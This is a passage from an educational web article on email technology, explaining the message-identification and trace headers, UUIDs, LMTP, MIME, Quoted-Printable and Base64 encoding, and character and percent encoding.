<p>There are <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.4">three header fields</a>
to identify the current message and the previous messages
in the same <a href="https://en.wikipedia.org/wiki/Conversation_threading">thread</a>:</p>
<ul>
  <li><code>Message-ID</code>: The <code>Message-ID</code> identifies the current message.
Its format is <code>&lt;{Value}@{Domain}&gt;</code>.
Although outgoing mail servers <a href="https://datatracker.ietf.org/doc/html/rfc6409#section-8.3">may add this field</a>
if it’s missing, the <code>Message-ID</code> should be chosen by the mail client.
Otherwise, the copy stored in the <a href="#double-submission-problem">sent folder</a>
on the incoming mail server lacks this field, which defeats its purpose.
Whoever chooses the <code>Message-ID</code> should make sure that it’s unique.
Mail clients often choose the <code>Value</code> as a <a href="#universally-unique-identifier">universally unique identifier (<abbr title="Universally Unique Identifier">UUID</abbr>)</a>
and the <code>Domain</code> as the domain part of the user’s email address.
The sender has to decide whether two messages are the same and thus share the same <code>Message-ID</code>.
If the client generates different versions of the same message due to <a href="#bcc-removal"><code>Bcc</code> recipients</a>,
it <a href="https://ietf-822.imc.narkive.com/MS33RTCW/the-bcc-issue#post19">should use the same <code>Message-ID</code></a> for all of them.</li>
  <li><code>In-Reply-To</code>: If a user replies to a message,
the <code>Message-ID</code> of the replied-to message is put into the <code>In-Reply-To</code> header field.</li>
  <li><code>References</code>: While <code>In-Reply-To</code> refers only to the direct parent message,
the <code>References</code> field lists the <code>Message-ID</code>s of all ancestor messages,
including the direct parent message.
This is useful to reconstruct a conversation even
if not all intermediary messages were sent to you.
Clients compose this field by adding the <code>Message-ID</code> of the replied-to message
to the <code>References</code> of the replied-to message.
When determining which messages belong to the same thread,
clients use <a href="https://jmap.io/spec-mail.html#threads">additional heuristics</a>,
such as comparing the <code>Subject</code> line after stripping <a href="#prefixes">common prefixes</a>,
to avoid grouping messages where a person replies to a message
just to send an unrelated message to the sender of the message.</li>
</ul>

<figure>

  <div><div><pre><code>Message-ID:  &lt;64F0D157-FD89-4858-9589-9BDD22870B22@example.org&gt;
In-Reply-To: &lt;BDC9DF60-660C-435D-B909-C16567A8470C@example.com&gt;
References:  &lt;BF5BBB3B-92F9-42E8-9353-A7579CF53E45@example.net&gt;
             &lt;BDC9DF60-660C-435D-B909-C16567A8470C@example.com&gt;
</code></pre></div>  </div>

  <figcaption>
An example of what the three message identification header fields look like.
The <code>References</code> field contains the message ID of the <code>In-Reply-To</code> field.
</figcaption>
</figure>

<details>
  <summary id="mandatory-header-fields">
Mandatory header fields
</summary>

  <p>According to <a href="https://datatracker.ietf.org/doc/html/rfc5322#page-21"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>,
only two header fields must be included in every message:
the <a href="#sender"><code>From</code> field</a> and the <a href="#origination-date"><code>Date</code> field</a>.
While not strictly mandatory, every message should have a <code>Message-ID</code>,
and every reply should have an <code>In-Reply-To</code> and a <code>References</code> header field
if the replied-to message had a <code>Message-ID</code>.</p>

</details>

<details>
  <summary id="quoting-the-previous-message">
Quoting the previous message
</summary>

  <p>It’s a common practice to quote the text of the original message in the reply,
but this is completely optional, and the format for doing so isn’t standardized.
Most mail clients <a href="https://en.wikipedia.org/wiki/Posting_style#Quoted_line_prefix">prefix quoted lines</a>
with the greater-than sign in a text-based response and wrap the quoted text in a
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/blockquote"><code>&lt;blockquote&gt;</code> element</a>
<a href="#html-emails">when using <abbr title="HyperText Markup Language">HTML</abbr></a>.
Modern clients typically display quoted text with a vertical bar.</p>

  <figure>

    <div><div><pre><code>Text of the current message
&gt; First line of the parent message
&gt; Second line of the parent message
&gt;&gt; Quoted text in the parent message
</code></pre></div>    </div>

    <figcaption>

How text is usually quoted at different nesting levels.
Quoting the text allows you to <a href="https://en.wikipedia.org/wiki/Posting_style#Interleaved_style">reply below each paragraph</a>
of the original message.

</figcaption>
  </figure>

  <p>If mail clients quote the message to which you reply,
they also add an <a href="https://en.wikipedia.org/wiki/Posting_style#Attribution_lines">attribution line</a>,
which mentions the author and the date of the original message.
Quoting text with <code>&gt;</code> is mentioned only in <a href="https://datatracker.ietf.org/doc/html/rfc1849#page-21"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1849</a>
and <a href="https://datatracker.ietf.org/doc/html/rfc3676#section-4.5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3676</a>,
the former being related to <a href="https://en.wikipedia.org/wiki/Usenet">Usenet</a> rather than traditional email.
One problem of quoting text with <code>&gt;</code> is that
this can cause lines to exceed the imposed <a href="#line-length-limit">length limit</a>.</p>

</details>

<details>
  <summary id="universally-unique-identifier">
Universally Unique Identifier (<abbr title="Universally Unique Identifier">UUID</abbr>)
</summary>

  <p><a href="https://en.wikipedia.org/wiki/Universally_unique_identifier">Universally Unique Identifier (<abbr title="Universally Unique Identifier">UUID</abbr>)</a>
is a standard for generating globally unique identifiers without coordination among the involved parties.
The standard has been published by various organizations,
including <abbr title="Internet Engineering Task Force">IETF</abbr> in <a href="https://datatracker.ietf.org/doc/html/rfc4122"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4122</a>.
A universally unique identifier is a 128-bit number,
which is encoded as 32 <a href="https://evalapply.org/internet/#number-encoding">hexadecimal digits</a>
with 4 hyphens inserted at fixed positions.
The format of <abbr title="Universally Unique Identifiers">UUIDs</abbr> is <code>XXXXXXXX-XXXX-AXXX-FXXX-XXXXXXXXXXXX</code>,
where the four bits of <code>A</code> encode the used algorithm,
and the first one to three bits of <code>F</code> encode the used format.
Please note that I use <code>A</code> and <code>F</code> as variable names here.
All the bits, including the actual values of <code>A</code> and <code>F</code>, are encoded as hexadecimal digits.
<code>X</code> stands for four bits. How those bits are determined depends on <code>A</code> and <code>F</code>.</p>

  <p>The format <code>F</code> is in binary either
<code>0xxx</code> for the original format,
<code>10xx</code> for the <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> format, or
<code>110x</code> for Microsoft’s format.
<code>111x</code> is reserved for a potential future format,
and the lowercase <code>x</code> stands for a single bit.</p>

  <p>When using the <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> format, the algorithm <code>A</code>, which is used to determine the remaining bits, is one of the following:</p>
  <ul>
    <li><code>1</code>: The remaining bits consist of the current <a href="https://en.wikipedia.org/wiki/Timestamp">timestamp</a>
and the <a href="https://evalapply.org/internet/#media-access-control-address"><abbr title="Message Authentication Code">MAC</abbr> address</a> of the device which generated the <abbr title="Universally Unique Identifier">UUID</abbr>.</li>
    <li><code>2</code>: A variant of algorithm <code>1</code> used in the
<a href="https://en.wikipedia.org/wiki/Distributed_Computing_Environment">Distributed Computing Environment (<abbr title="Distributed Computing Environment">DCE</abbr>)</a>
by the <a href="https://en.wikipedia.org/wiki/Open_Software_Foundation">Open Software Foundation (<abbr title="Open Software Foundation">OSF</abbr>)</a>.</li>
    <li><code>3</code>: The <a href="https://en.wikipedia.org/wiki/MD5"><abbr title="Message Digest version 5">MD5</abbr></a> hash of a namespace identifier
and a name within that namespace.
<code>A</code> and <code>F</code> overwrite six bits of the <abbr title="Message Digest version 5">MD5</abbr> hash.</li>
    <li><code>4</code>: The remaining 122 bits are chosen <a href="https://en.wikipedia.org/wiki/Pseudorandom_number_generator">randomly</a>.
The message IDs in the example above were chosen with this algorithm.</li>
    <li><code>5</code>: Algorithm <code>5</code> is the same as algorithm <code>3</code> but it uses <a href="https://en.wikipedia.org/wiki/SHA-1"><abbr title="Secure Hash Algorithm">SHA</abbr>-1</a>
instead of <abbr title="Message Digest version 5">MD5</abbr> as the <a href="#cryptographic-hash-functions">cryptographic hash function</a>.</li>
  </ul>

</details>

<h3 id="trace-information">Trace information</h3>

<p>According to <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.4"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a>,
whenever a mail server receives a message,
it must add a <code>Received</code> header field at the beginning of the message
without changing or deleting already existing <code>Received</code> header fields.
<code>Received</code> header fields have the <a href="https://datatracker.ietf.org/doc/html/rfc5321#page-60">following format</a>:</p>

<figure>

  <div><div><pre><code>Received: from {EhloArgument} ({DnsReverseLookup} {IpAddressOfClient})
    by {DomainNameOfServer}
    with {Protocol}
    id {SessionId}
    for {AddressOfRecipient};
    {DayOfWeek}, {Day} {Month} {Year} {Hour}:{Minute}:{Second} {TimeZone}
</code></pre></div>  </div>

  <figcaption>

The format of <code>Received</code> header fields.
The curly brackets stand for values which need to be inserted.
The <code>with</code>, <code>id</code>, and <code>for</code> clauses are optional.
The newlines can be in other places, and additional information is often added
as <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.2.2">comments in parentheses</a> in various places.

</figcaption>
</figure>

<p>According to <a href="https://datatracker.ietf.org/doc/html/rfc5321#page-61"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a>,
the <code>Protocol</code> is either <code>SMTP</code> or <code>ESMTP</code>.
<a href="https://datatracker.ietf.org/doc/html/rfc3848"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3848</a> specified additional values:
<code>ESMTPA</code> when <a href="#extended-simple-mail-transfer-protocol"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr></a> is used
with successful <a href="#user-authentication">user authentication</a>,
<code>ESMTPS</code> when <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> is used with <a href="#use-of-tls">Implicit or Explicit <abbr title="Transport Layer Security">TLS</abbr></a>,
and <code>ESMTPSA</code> when the session has been secured and the user has been authenticated.
<a href="https://datatracker.ietf.org/doc/html/rfc8314#section-4.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 8314</a> specifies an additional <code>tls</code> clause,
which can be used after the <code>for</code> clause to record the
<a href="https://en.wikipedia.org/wiki/Transport_Layer_Security#Algorithms"><abbr title="Transport Layer Security">TLS</abbr> ciphersuite</a>
which has been used.
Gmail adds such information as a comment instead:
<code>(version=TLS1_2 cipher=ECDHE-ECDSA-CHACHA20-POLY1305 bits=256/256)</code>.
Checking the <code>Received</code> header fields of a received message gives you an idea
whether the message was <a href="#reporting-in-header-fields">secured during transport</a>.
Note, however, that <code>Received</code> header fields are not authenticated:
The mail servers through which a message passes can change the <code>Received</code> header fields
that were added by mail servers through which the message already passed.
In addition, not all mail servers might support the newer protocol values,
and <a href="#local-mail-transfer-protocol">relays over a private network</a> are often not protected with <abbr title="Transport Layer Security">TLS</abbr>.
A message typically has at least four <code>Received</code> header fields,
which makes sense only when you look at the <a href="#official-architecture">official architecture</a>
instead of the <a href="#simplified-architecture">simplified architecture</a>.
A <code>Received</code> header field is added by the mail submission agent (<abbr title="Mail Submission Agent (your outgoing mail server requiring authentication)">MSA</abbr>), the outgoing mail transfer agent (<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>),
the incoming mail transfer agent (<abbr title="Mail Transfer Agent (SMTP for Relay client and server)">MTA</abbr>), and the mail delivery agent (<abbr title="Mail Delivery Agent (your incoming mail server applying rules)">MDA</abbr>).
Here is a <code>Received</code> header field, which was added by my outgoing mail server:</p>

<figure>

  <div><div><pre><code>Received: from [192.168.1.2] (unknown [203.0.113.167])
    (Authenticated sender: kaspar@ef1p.com)
    by relay12.mail.gandi.net (Postfix) with ESMTPSA id 7974D200009
    for &lt;contact@ef1p.com&gt;; Thu, 3 Dec 2020 14:14:48 +0000 (UTC)
</code></pre></div>  </div>

  <figcaption>

What an actual <code>Received</code> header field looks like.
I’ve only replaced my <abbr title="Internet Protocol">IP</abbr> address with an <a href="https://datatracker.ietf.org/doc/html/rfc5737">address reserved for documentation</a>.
Due to <a href="https://evalapply.org/internet/#network-address-translation">Network Address Translation (<abbr title="Network Address Translation">NAT</abbr>)</a>,
the <a href="https://en.wikipedia.org/wiki/Private_network">private <abbr title="Internet Protocol">IP</abbr> address</a>
that my computer used in the <a href="#extended-simple-mail-transfer-protocol"><code>EHLO</code> command</a>
and the public <abbr title="Internet Protocol">IP</abbr> address that the outgoing mail server saw were different.
Since my public <abbr title="Internet Protocol">IP</abbr> address doesn’t have a <a href="#reverse-dns-entry">reverse <abbr title="Domain Name System">DNS</abbr> entry</a>,
the server recorded the name of the client as <code>unknown</code>.
<code>(Authenticated sender: kaspar@ef1p.com)</code> is a comment,
which the server added to indicate which user submitted the message.
<code>(Postfix)</code> is also a comment, indicating the name of the server implementation.
Everything else matches the format which I’ve described <a href="#trace-information">above</a>.

</figcaption>
</figure>

<p>An incoming mail server which delivers a message
must add the <code>MAIL FROM</code> address of the <a href="#message-versus-envelope">envelope</a>
in a <code>Return-Path</code> header field to the message.
While a message can have several <code>Received</code> header fields,
it may have at most one <code>Return-Path</code> header field.
If a message is resubmitted, for example by a <a href="#email-filtering">filtering rule</a>,
the <code>Return-Path</code> header field should be removed,
and its value should be used as the <code>MAIL FROM</code> address.
As we discussed <a href="#diverging-envelope-example">earlier</a>,
the <code>Return-Path</code> header field can be different from the <code>From</code> header field.</p>

<figure>

  <div><div><pre><code>Return-Path: &lt;kaspar@ef1p.com&gt;
</code></pre></div>  </div>

  <figcaption>
What a <code>Return-Path</code> header field looks like.
</figcaption>
</figure>

<details>
  <summary id="bcc-recovery">
Recover why you received a message
</summary>

  <p>Since the <code>Bcc</code> recipients are <a href="#bcc-removal">usually removed from the message</a>
even for the <code>Bcc</code> recipients themselves,
mail clients don’t know whether a message has been forwarded
or whether the user was a hidden recipient
if the user’s address is not listed among the recipients.
By inspecting the <code>Received</code> header fields,
mail clients could easily distinguish between the two scenarios in most cases:
If the message has been forwarded,
there should be a <code>Received</code> header field with one of the recipient addresses in the <code>for</code> clause.
Recovering the address through which a message has been forwarded to your mailbox
could be useful for <a href="#email-filtering">filtering</a> incoming messages into different folders automatically.
And as we discussed <a href="#bcc-removal">earlier</a>,
mail clients shouldn’t offer a reply-to-all option for messages
where the user was a <code>Bcc</code> recipient
as this would leak what the sender tried to hide by using the <code>Bcc</code> field.</p>

</details>

<details>
  <summary id="local-mail-transfer-protocol">
Local Mail Transfer Protocol (<abbr title="Local Mail Transfer Protocol">LMTP</abbr>)
</summary>

  <p>The <a href="https://en.wikipedia.org/wiki/Local_Mail_Transfer_Protocol">Local Mail Transfer Protocol (<abbr title="Local Mail Transfer Protocol">LMTP</abbr>)</a>
is a variant of the <a href="#extended-simple-mail-transfer-protocol">Extended Simple Mail Transfer Protocol (<abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr>)</a>,
in which the server can reject an incoming message for each recipient individually.
In the case of <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr>, the server can send only a single reply after the message has been transferred.
If the message can be delivered to some of the recipients but not all of them,
the <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> server has to queue the message in order to deliver it to the pending recipients at some later point.
In the case of <abbr title="Local Mail Transfer Protocol">LMTP</abbr>, the server has to confirm the acceptance of the message for each recipient
which was provided with the <code>RCPT TO</code> command.
Being able to reject a message for individual recipients frees <abbr title="Local Mail Transfer Protocol">LMTP</abbr> servers from having to manage a mail queue.</p>

  <p><abbr title="Local Mail Transfer Protocol">LMTP</abbr> is specified in <a href="https://datatracker.ietf.org/doc/html/rfc2033"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2033</a> and may be used only in a local network.
<abbr title="Local Mail Transfer Protocol">LMTP</abbr> uses <code>LHLO</code> instead of <code>EHLO</code> to greet the server.
I’ve included <abbr title="Local Mail Transfer Protocol">LMTP</abbr> only because you might encounter it as <code>LMTP[S][A]</code>
in the <code>with</code> clause of a <code>Received</code> header field.
<abbr title="Local Mail Transfer Protocol">LMTP</abbr> also pops up in other places,
for example in the <a href="https://github.com/libressl-portable/openbsd/blob/6b643cda77ab1b4fede5c692cebfb21f8ef16f95/src/usr.bin/openssl/s_client.c#L1176-L1205">code</a>
to which I linked <a href="#libressl-doesnt-support-managesieve">earlier</a>.</p>

</details>

<h3 id="content-encoding">Content encoding</h3>

<p><a href="https://datatracker.ietf.org/doc/html/rfc5322"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a> specifies a format for text messages,
whose lines may consist of at most <a href="#line-length-limit">1’000 <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters</a>.
Whenever the content of a message doesn’t fulfill this requirement,
it must be encoded according to the
<a href="https://en.wikipedia.org/wiki/MIME">Multipurpose Internet Mail Extensions (<abbr title="Multipurpose Internet Mail Extensions">MIME</abbr>)</a>
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc2045"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2045</a>.
When mail clients encode messages according to <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr>,
they indicate this with the following header field:</p>

<figure>

  <div><div><pre><code>MIME-Version: 1.0
</code></pre></div>  </div>

  <figcaption>
The header field used to indicate that a message is formatted using <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr>.
</figcaption>
</figure>

<p>In theory, the version number allows the Internet community to make changes to the standard.
In practice, however, the standard <a href="https://en.wikipedia.org/wiki/MIME#MIME-Version">didn’t specify</a>
how mail clients are supposed to handle messages with an unknown <abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> version.
As a consequence, you cannot change the version number without breaking email communications,
which makes this header field completely useless.
The version 1.0 survived the last 30 years and will likely survive the next 30 years.
<abbr title="Multipurpose Internet Mail Extensions">MIME</abbr> also introduced additional message header fields,
which we’ll cover in this and the following subsections.</p>

<p>Unless all involved <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> servers support the <code>BINARYMIME</code> extension
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc3030"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3030</a>, which is rarely the case,
content containing non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters or lines longer than 1’000 characters
must be encoded with one of the following two methods:</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Quoted-printable"><strong>Quoted-Printable</strong></a>:
Any byte which doesn’t represent a <a href="https://en.wikipedia.org/wiki/ASCII#Printable_characters">printable <abbr title="American Standard Code for Information Interchange">ASCII</abbr> character</a>
is encoded with the <a href="https://en.wikipedia.org/wiki/Equals_sign">equality sign</a>
followed by the value of the byte encoded as two <a href="https://evalapply.org/internet/#number-encoding">hexadecimal digits</a>.
Since <code>=</code> is used as the <a href="https://en.wikipedia.org/wiki/Escape_character">escape character</a>,
it has to be encoded with its hexadecimal <abbr title="American Standard Code for Information Interchange">ASCII</abbr> value as <code>=3D</code>.
Lines may be at most 78 characters long, including <a href="#newline-characters"><code>{CR}{LF}</code></a>.
Longer lines have to be broken by inserting <code>={CR}{LF}</code>.
All sequences of these three characters are removed when decoding the Quoted-Printable encoding.
Since some mail servers add or remove trailing whitespace,
tabs and spaces which are followed by <code>{CR}{LF}</code> also need to be encoded with hexadecimal digits.
Any sequence of bytes can be encoded with this method.
However, the Quoted-Printable encoding makes sense only
if most of the bytes are printable <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters.
This is the case for those European languages which share most of their characters
with the <a href="https://en.wikipedia.org/wiki/English_alphabet">English alphabet</a>.
Texts in such languages remain largely readable when using the Quoted-Printable encoding.
The probability that a random byte falls into the range of printable <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters
is just a bit bigger than one third, though.
Thus, the size of binary data, such as images, more than doubles with this encoding.
The following tool allows you to encode and decode Quoted-Printable:
    
  </li>
  <li><a href="https://en.wikipedia.org/wiki/Base64"><strong>Base64</strong></a>:
Binary data and non-Western-European languages are best encoded with Base64.
While hexadecimal digits encode 4 bits each, Base64 digits encode 6 bits each.
6 bits can represent 2<sup>6</sup> = 64 different values.
Base64 uses the characters <code>A</code> – <code>Z</code>, <code>a</code> – <code>z</code>, <code>0</code> – <code>9</code>, <code>+</code>, and <code>/</code> to encode these 64 values.
What makes the Base64 encoding special is that bytes and digits don’t align:
Three bytes are encoded with four Base64 digits.
If you shift the input by one or two bytes, the Base64 encoding looks completely different.
If the size of the input is not a multiple of three,
one or two equality signs are appended to the output
in order to make the output a multiple of four.
This procedure is known as <a href="https://en.wikipedia.org/wiki/Base64#Output_padding">padding</a>.
In order to respect the <a href="#line-length-limit">line-length limit</a>,
a line break is inserted after at most 76 Base64 characters.
Base64 encoding increases the size of the content by 33%
and the line breaks add another 2.6% on top of that.
You can encode and decode Base64 with the following tool:
    
  </li>
</ul>

<p>The mail client of the sender informs the mail client of the recipient with the following header field
that the content is encoded:</p>

<figure>

  <div><div><pre><code>Content-Transfer-Encoding: {Value}
</code></pre></div>  </div>

  <figcaption>

This header field indicates with which method the content of the message has to be decoded.</figcaption>
</figure>

<p>If the message already consists of only printable <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters,
the line-length limit can also be achieved with <a href="#soft-line-breaks">soft line breaks</a>.</p>

<details>
  <summary id="character-encoding">
Character encoding (<abbr title="Character Set (specifying how text characters are encoded)">charset</abbr>)
</summary>

  <p>The <a href="https://en.wikipedia.org/wiki/Character_encoding">character encoding</a>
determines how each character is encoded as a sequence of zeros and ones.
I’ve already covered this in the <a href="https://evalapply.org/internet/#text-encoding">previous article</a>.
What we’re interested in now is how this affects the Quoted-Printable and Base64 encodings.
The most popular character encodings are
<a href="https://en.wikipedia.org/wiki/ASCII"><abbr title="American Standard Code for Information Interchange">ASCII</abbr></a>,
<a href="https://en.wikipedia.org/wiki/ISO/IEC_8859-1">ISO-8859-1</a>,
and <a href="https://en.wikipedia.org/wiki/UTF-8"><abbr title="Unicode Transformation Format">UTF</abbr>-8</a>.
<abbr title="American Standard Code for Information Interchange">ASCII</abbr> encodes each character with 7 bits,
leaving the 8th bit in each byte unused.
Its set of characters (<abbr title="Character Set (specifying how text characters are encoded)">charset</abbr> for short) includes only the English alphabet.
ISO-8859-1 extends <abbr title="American Standard Code for Information Interchange">ASCII</abbr> with characters used in Western European languages,
such as <code>à</code>, <code>á</code>, <code>â</code>, <code>ã</code>, <code>ä</code>, <code>å</code>, and the like.
Each ISO-8859-1 character is encoded with 8 bits.
<abbr title="Unicode Transformation Format">UTF</abbr>-8, on the other hand, encodes all the <a href="https://en.wikipedia.org/wiki/Code_point">code points</a>
defined by <a href="https://en.wikipedia.org/wiki/Unicode">Unicode</a> with 1, 2, 3, or 4 bytes.
Both ISO-8859-1 and <abbr title="Unicode Transformation Format">UTF</abbr>-8 encode the <abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters if the first bit of a byte is zero.
For non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters, <abbr title="Unicode Transformation Format">UTF</abbr>-8 needs <a href="https://en.wikipedia.org/wiki/UTF-8#Encoding">at least two bytes</a>.
Therefore, if all the characters in a message can be encoded with ISO-8859-1,
the Quoted-Printable and the Base64 encodings are shorter
if the input string is encoded with ISO-8859-1 rather than with <abbr title="Unicode Transformation Format">UTF</abbr>-8.
You can verify this with the tool above: The Quoted-Printable encoding of the
<a href="https://en.wikipedia.org/wiki/Inverted_exclamation_mark">inverted exclamation mark</a>
is <code>=A1</code> when using ISO-8859-1 and <code>=C2=A1</code> when using <abbr title="Unicode Transformation Format">UTF</abbr>-8.</p>

  <figure>
    <svg id="figure-character-sets" data-name="character-sets" width="350.076" height="84" viewBox="-11.25 -11.25 350.076 84" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <rect x="0" y="0" width="109.192" height="61.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="54.596" y="25.65"><tspan><tspan>ascii</tspan></tspan></tspan><tspan x="54.596" y="47.65">7 bits</tspan>
    </text>
    <rect x="-5" y="-5" width="228.384" height="71.5" rx="13" ry="13"></rect>
    <text text-anchor="middle">
        <tspan x="166.288" y="25.65"><tspan><tspan>iso-8859-1</tspan></tspan></tspan><tspan x="166.288" y="47.65">8 bits</tspan>
    </text>
    <rect x="-10" y="-10" width="347.576" height="81.5" rx="18" ry="18"></rect>
    <text text-anchor="middle">
        <tspan x="277.98" y="25.65"><tspan><tspan>utf-8</tspan></tspan></tspan><tspan x="277.98" y="47.65">8 to 32 bits</tspan>
    </text>

</svg>

    <figcaption>
<abbr title="American Standard Code for Information Interchange">ASCII</abbr> encodes only a subset of the characters defined in ISO-8859-1,
and ISO-8859-1 encodes only a fraction of the characters available in <abbr title="Unicode Transformation Format">UTF</abbr>-8.
</figcaption>
  </figure>

</details>

<details>
  <summary id="percent-encoding">
Percent encoding (<abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr> encoding)
</summary>

  <p>If you ever did some <a href="https://en.wikipedia.org/wiki/Web_development">web development</a>,
you might have encountered the <a href="https://en.wikipedia.org/wiki/Percent-encoding">Percent encoding</a>.
It’s used to encode arbitrary data in a
<a href="https://en.wikipedia.org/wiki/Uniform_Resource_Identifier">Uniform Resource Identifier (<abbr title="Uniform Resource Identifier (a format for unique resource names)">URI</abbr>)</a>,
such as a <a href="https://en.wikipedia.org/wiki/Uniform_Resource_Locator">Uniform Resource Locator (<abbr title="Uniform Resource Locator (the formal name for a web address)">URL</abbr>)</a>.
The Percent encoding is specified in <a href="https://datatracker.ietf.org/doc/html/rfc3986#section-2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 3986</a>,
and it works similar to the Quoted-Printable encoding.
The difference is that the Percent encoding has a longer list of
<a href="https://datatracker.ietf.org/doc/html/rfc3986#section-2.2">reserved characters</a>
and that the <a href="https://en.wikipedia.org/wiki/Percent_sign">percent sign</a>
is used as the escape character instead of the equality sign.
Additionally, <a href="https://en.wikipedia.org/wiki/Whitespace_character">whitespace</a>,
including newlines, have to be encoded, and Percent encoding is usually used on <abbr title="Unicode Transformation Format">UTF</abbr>-8 strings.
I’ve included this box and the following tool mostly for the sake of completeness.
The only place where you might find Percent-encoded strings in emails
is in <a href="https://en.wikipedia.org/wiki/Hyperlink">links</a> of <a href="#html-emails"><abbr title="HyperText Markup Language">HTML</abbr> messages</a>.</p>

  

</details>

<details>
  <summary id="decoding-on-the-command-line">
Decoding on the command line
</summary>

  <p>If you use <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a> or <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>
to fetch messages from your <a href="#command-line-interface">command-line interface</a>,
you likely also want to decode the received messages on the command line.
The following commands read the string to encode or decode from their
<a href="https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)">standard input</a>
and write the encoded or decoded string to their
<a href="https://en.wikipedia.org/wiki/Standard_streams#Standard_output_(stdout)">standard output</a>.
This allows you to use the commands both in <a href="https://en.wikipedia.org/wiki/Pipeline_(Unix)">pipelines</a>,
such as <code>echo -n &#39;input&#39; | {Command}</code>,
and with <a href="https://en.wikipedia.org/wiki/Redirection_(computing)">files</a>,
such as <code>{Command} &lt; input.txt &gt; output.txt</code>.</p>

  <figure>
    
    <figcaption>

How to encode (<code>-e</code>) and decode (<code>-d</code>) Quoted-Printable with <a href="https://www.fourmilab.ch/webtools/qprint/"><code>qprint</code></a>.
Use <code>brew install qprint</code> to install this command on macOS.

</figcaption>
  </figure>

  <figure>
    
    <figcaption>

How to encode (<code>-e</code>) and decode (<code>-d</code>) Quoted-Printable with the
<a href="https://www.npmjs.com/package/quoted-printable"><code>quoted-printable</code></a>
package if you already have <a href="https://nodejs.org/en/">Node.js</a>.

</figcaption>
  </figure>

  <figure>
    
    <figcaption>

How to encode (<code>-e</code>) and decode (<code>-d</code>) Base64 with
<a href="https://www.openssl.org/docs/manmaster/man1/openssl-enc.html">OpenSSL</a>.
Use the option <code>-A</code> to have no newline characters inserted or expected.

</figcaption>
  </figure>

  <figure>
    
    <figcaption>

How to encode and decode Quoted-Printable, Base64, and Percent with <a href="https://en.wikipedia.org/wiki/Perl">Perl</a>,
which is likely preinstalled on your computer.
You can use <a href="https://explainshell.com/explain?cmd=perl+-MMIME%3A%3AQuotedPrint+-0777+-nle+%27print+decode_qp%28%24_%29%27">explainshell.com</a> to learn more about the used options.
The code uses the <a href="https://perldoc.perl.org/MIME::QuotedPrint"><abbr title="Multipurpose Internet Mail Extensions">MIME</abbr>::QuotedPrint</a>,
<a href="https://perldoc.perl.org/MIME::Base64"><abbr title="Multipurpose Internet Mail Extensions">MIME</abbr>::Base64</a>, and
<a href="https://metacpan.org/pod/URI::Escape"><abbr title="Uniform Resource Identifier (a format for unique resource names)">URI</abbr>::Escape</a> modules.

</figcaption>
  </figure>

  <figure>
    
    <figcaption>

How to encode and decode Quoted-Printable, Base64, and Percent with
<a href="https://en.wikipedia.org/wiki/Python_(programming_language)">Python</a>,
which is likely preinstalled on your computer.</figcaption>
  </figure>

</details>



<p><a href="https://datatracker.ietf.org/doc/html/rfc2047"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2047</a> specifies how one can use non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters
in <a href="https://datatracker.ietf.org/doc/html/rfc2047#page-8">certain header field values</a>,
such as the <a href="#subject">subject</a> and the <a href="#display-name">display names</a>.
Instead of introducing new header fields to specify the encoding of existing header fields,
encodings in header fields indicate which <a href="#character-encoding">character encoding</a>
and which <a href="#content-encoding">content encoding</a> has been used.
This results in the so-called <a href="https://en.wikipedia.org/wiki/MIME#Encoded-Word">Encoded-Word encoding</a>.
Its format is as follows: <code>=?{CharacterEncoding}?{ContentEncoding}?{EncodedText}?=</code>,
